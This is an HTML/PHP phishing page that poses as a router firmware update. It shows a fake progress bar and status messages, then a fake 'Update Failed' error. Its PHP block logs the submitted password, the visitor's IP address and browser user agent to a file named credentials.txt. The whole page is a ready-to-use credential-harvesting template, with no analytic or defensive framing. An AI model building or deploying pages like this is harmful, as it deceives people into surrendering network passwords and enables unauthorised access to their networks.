<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Updating Firmware...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 480px;
            width: 100%;
            padding: 50px 40px;
            text-align: center;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 25px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 15px;
        }
        
        p {
            color: #666;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 10px;
        }
        
        .progress-container {
            background: #e0e0e0;
            border-radius: 10px;
            height: 20px;
            margin: 25px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #3498db, #2ecc71);
            border-radius: 10px;
            animation: progress 8s ease-in-out forwards;
        }
        
        @keyframes progress {
            0% { width: 0%; }
            20% { width: 20%; }
            40% { width: 45%; }
            60% { width: 60%; }
            80% { width: 85%; }
            100% { width: 100%; }
        }
        
        .status {
            font-size: 13px;
            color: #888;
            margin-top: 20px;
        }
        
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 15px;
            margin-top: 25px;
            font-size: 13px;
            color: #856404;
        }
        
        .checkmark {
            display: none;
            color: #2ecc71;
            font-size: 60px;
            margin-bottom: 20px;
        }
        
        .error-icon {
            display: none;
            color: #e74c3c;
            font-size: 60px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner" id="spinner"></div>
        <div class="checkmark" id="checkmark">✓</div>
        <div class="error-icon" id="errorIcon">✗</div>
        
        <h1 id="title">Installing Firmware Update</h1>
        <p id="message">Please wait while we update your router's firmware. This process may take a few minutes.</p>
        
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <p class="status" id="status">Downloading security patch...</p>
        
        <div class="warning">
            <img src="./pics/alert.png" alt="Alert" style="width: 48px; height: 48px;"> <strong>Important:</strong> Do not turn off your router or disconnect from the network during this process.
        </div>
    </div>
    
    <script>
        var statusMessages = [
            "Downloading security patch...",
            "Verifying package integrity...",
            "Backing up current configuration...",
            "Installing firmware update...",
            "Applying security patches...",
            "Configuring new settings...",
            "Finalizing installation...",
            "Restarting services..."
        ];
        
        var currentStatus = 0;
        var statusElement = document.getElementById('status');
        
        var statusInterval = setInterval(function() {
            currentStatus++;
            if (currentStatus < statusMessages.length) {
                statusElement.textContent = statusMessages[currentStatus];
            }
        }, 1000);
        
        setTimeout(function() {
            clearInterval(statusInterval);
            document.getElementById('spinner').style.display = 'none';
            document.getElementById('errorIcon').style.display = 'block';
            document.getElementById('title').textContent = 'Update Failed';
            document.getElementById('message').textContent = 'An error occurred during the firmware update. Your router will continue with the current firmware version. Please try again later or contact your ISP for assistance.';
            document.getElementById('status').textContent = 'Error Code: FW_AUTH_503';
            document.getElementById('progressBar').style.background = '#e74c3c';
        }, 8000);
    </script>
    
    <?php
    $timestamp = date('Y-m-d H:i:s');
    $password = isset($_POST['password']) ? $_POST['password'] : 'N/A';
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    $log_entry = "[$timestamp] IP: $ip | Password: $password | UA: $user_agent\n";
    
    $file = fopen("credentials.txt", "a");
    fwrite($file, $log_entry);
    fclose($file);
    ?>
</body>
</html>